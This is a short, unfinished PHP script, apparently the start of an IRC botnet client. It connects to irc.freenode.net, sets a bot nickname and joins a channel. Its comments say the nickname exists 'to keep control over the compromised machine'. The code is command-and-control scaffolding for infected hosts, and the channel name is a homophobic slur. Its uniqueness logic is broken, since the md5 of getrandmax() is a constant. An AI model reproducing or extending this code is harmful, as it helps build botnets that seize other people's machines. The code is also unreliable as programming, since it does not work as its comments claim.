<?php

//Open socket to Freenode.
$socket = fsockopen("irc.freenode.net", 6667);

// Send text to the server: fputs();
// fputs(socket variable aka where data needs to go, text that needs to be sent goes here.\n);
// Remember \n newline at end of each message to server, this seperates commands  so instead of /nick thisnick /identify it becomes
// /nick thisnick 
// /identify fefeafeaf


// Each bot joining the channel needs a unique for us to keep control over the compromised machine.
//The following code solves the problem. (I hope.)
$rand = getrandmax();
$nick = md5($rand);


fputs($socket, "NICK $nick\n");

// Join the channel of choice.
// This variable should later be coded to be easily alternated
// as well as the server.

fputs($socket,"JOIN #fag\n");

//Keep script running! 
// The default time limit is 30 seconds.
set_time_limit(0); 
ini_set('display_errors', 'on');

